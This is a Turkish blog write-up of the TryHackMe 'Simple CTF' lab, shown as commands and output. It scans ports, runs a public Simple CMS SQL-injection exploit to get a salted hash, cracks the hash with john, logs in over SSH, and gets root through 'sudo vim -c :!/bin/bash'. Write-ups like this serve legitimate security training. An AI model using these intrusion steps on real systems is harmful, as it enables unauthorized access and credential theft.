---
title: 'TryHackMe | Simple CTF WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [sql injection]
render_with_liquid: false
---

Bu yazımda, TryHackMe platformunda yer alan “Simple CTF” isimli meydan okumayı çözeceğiz. Öncelikle hedefi tanımak adına nmap ile bir port taraması yapalım. Daha sonra açık portlara ve üzerinde çalışan servislere göre yolumuzu çizmeye başlayabiliriz.

```console
$ nmap -sV -sC -T4 10.10.100.158
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.66.61
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Tarama sonucunda 21 (FTP), 80 (HTTP) ve 2222 (SSH) numaralı portların açık olduğunu öğreniyoruz. Ayrıca FTP servisine misafir olarak bağlanabiliyoruz. İçerisinde aşağıdaki mesaj bulunuyor.

```
Dammit man… you’te the worst dev i’ve seen. You set the same pass for the system user, and the password is so weak… i cracked it in seconds. Gosh… what a mess!
```

Sanırım bir hash’i kırdı ve elde ettiği parolanın sistem kullanıcısıyla aynı parolaya sahip olduğunu öğrendi. HTTP servisinde varsayılan Apache sayfası bulunuyor. Kaynak kodunda herhangi bir bilgi bulunmadığından doğrudan dirsearch ile dosya/dizin taraması başlattım.

```console
$ dirsearch -u http://10.10.100.158
...
[13:18:21] 200 -  540B  - /robots.txt
[13:18:26] 301 -  315B  - /simple  ->  http://10.10.100.158/simple/
...
```

Tarama sonucunda simple adında bir dizin olduğunu öğrendik. Bu dizine gittiğimizde “Simple CMS” adında bir web uygulaması ile karşılaşıyoruz. İçerik yönetim sisteminin adı ile sürümünü internette arattıktan sonra [exploit-db](https://www.exploit-db.com/exploits/46635) sitesinde paylaşılmış bir exploit olduğunu öğreniyoruz. Exploit’i python3 üzerinde çalışacak şekilde düzenledikten sonra çalıştırıyor ve kullanıcı bilgilerini buluyoruz.

```console
$ python3 exploit.py -u http://10.10.100.158/simple/
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

Exploit’te hash’i kırmak için bir fonksiyon bulunuyor ama parametresini eklediğimde bir hata ile karşılaşıyorum. Bu hatayı çözemediğimden john ile kırmaya karar verdim. Fonksiyonu aşağıda görüyorsunuz.

```py
def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()
```

Burada verdiğimiz parola listesindeki parolaları teker teker alıp önceden belirlenmiş bir verinin sonuna ekliyor ve md5 algoritmasını kullanarak şifreliyor. Daha sonra ise sistemdeki hash ile karşılaştırıyor. Hash’i aşağıdaki şekilde bir dosyaya kayıt edelim ve john’u çalıştıralım.

```
0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2
```

```console
$ sudo john -form=dynamic='md5($s.$p)' hash --wordlist=Desktop/rockyou.txt
...
Press 'q' or Ctrl-C to abort, almost any other key for status
s****t           (?)     
...
```

Şimdi elde ettiğimiz hash ile SSH servisine bağlanabiliriz. Bağlanmaya çalışmadan önce port'u 2222 olarak ayarladığınızdan emin olun.

```console
$ ssh mitch@10.10.100.158 -p 2222
...
mitch@Machine:~$ ls
user.txt
mitch@Machine:~$ cat user.txt 
G***p!
```

İlk bayrağı bulunduğumuz dizinden alıyoruz. Daha sonra “sudo -l” komutunu kullandığımda vim aracını root haklarıyla çalıştırabileciğimi öğrendim. -c parametresi ile kod çalıştırabiliyoruz.

```console
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:~$ sudo /usr/bin/vim -c ':!/bin/bash'
root@Machine:~# cd /root
root@Machine:/root# ls
root.txt
```
